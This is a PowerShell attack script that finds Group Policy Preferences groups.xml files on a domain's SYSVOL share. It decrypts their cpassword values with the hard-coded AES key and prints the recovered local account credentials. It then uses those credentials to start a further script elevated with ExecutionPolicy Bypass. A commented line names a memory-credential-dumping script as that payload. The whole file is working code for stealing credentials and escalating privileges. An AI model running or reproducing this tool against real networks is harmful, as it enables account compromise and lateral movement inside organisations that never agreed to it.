function Get-DecryptMyPassword {
    Param  (
    [Parameter(Position=0,mandatory=$true)]    
    [ValidateNotNullOrEmpty()] 
    [String] $cPassword
    )

    try{
        $mod=($cPassword.length % 4)
        if($mod -ne 0) {
            $pad = "=" * (4 - ($cPassword.Length % 4))
        }
        $base64Decoded = [Convert]::FromBase64String($cPassword + $pad)
        $AESObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [byte[]] $AESKey = @(0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 
                            0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 
                            0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b)
        $AESIV = New-Object byte[]($AESObject.IV.Length)
        $AESObject.IV = $AESIV
        $AESObject.Key = $AESKey
        $decryptorObject = $AESObject.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($base64Decoded, 0 , $base64Decoded.Length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($outBlock)
    }
    catch {
        Write-Host "$error[0]"
    }
}

$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::getCurrentDomain().Name 

$filePath = "\\$currentDomain\SYSVOL\$currentDomain\Policies"

$fileName = "groups.xml"
$nonSecureFilePath = Get-ChildItem -Recurse -Force $filePath -ErrorAction SilentlyContinue | Where-Object { ($_.PSIsContainer -eq $false) -and  ( $_.Name -like "*$fileName*") } | Select-Object Name,Directory
if($nonSecureFilePath -ne $Null) {
    Write-Host "`nA groups.xml file was found !" -ForegroundColor Red
    $directory = $nonSecureFilePath.Directory
    $nonSecureFileName = $nonSecureFilePath.Name
    $xmlPath = "$directory\$nonSecureFileName"
    $nodes = ( Select-Xml -Path $xmlPath -XPath / ).Node
    $nodes | ForEach-Object {
        $userNameGroups = $_.Groups.User.Properties.userName
        $cPassword = $_.Groups.User.Properties.cpassword
    }
    if($cPassword -ne $Null) {
        $decryptedPassword = Get-DecryptMyPassword -cPassword $cPassword
        Write-Host "A local password was found ! $userNameGroups\$decryptedPassword" -ForegroundColor Red
    }    
}

$credential = New-Object System.Management.Automation.PsCredential(".\$userNameGroups", (ConvertTo-SecureString $decryptedPassword -AsPlainText -Force))

$scriptPath = Split-Path $MyInvocation.InvocationName

#$RWMC = $scriptPath + "\Reveal-MemoryCredentials.ps1"
$RWMC = $scriptPath + "\test.ps1"

$ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;

Start-Process -FilePath powershell.exe `
    -Credential $credential `
    -ArgumentList $ArgumentList -Wait -NoNewWindow;